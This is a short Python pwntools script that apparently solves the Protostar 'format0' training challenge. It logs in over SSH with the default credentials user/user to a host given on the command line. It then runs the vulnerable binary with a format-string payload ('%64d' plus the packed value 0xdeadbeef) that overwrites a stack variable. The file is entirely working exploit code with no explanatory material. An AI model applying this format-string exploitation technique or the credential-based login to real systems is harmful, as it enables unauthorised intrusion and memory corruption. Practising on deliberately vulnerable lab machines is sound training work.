#!/usr/bin/env python
from pwn import *
import sys

if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
else:
    s = ssh("user", sys.argv[1], 22, password="user")
    payload = "%64d"          # 64 is the offset for next stack variable
    payload += p32(0xdeadbeef)# 0xdeadbeef is the desired value for the variable
    r = s.run('/opt/protostar/bin/format0 {}'.format(payload))
    print(r.recv(1024))
    r.close()

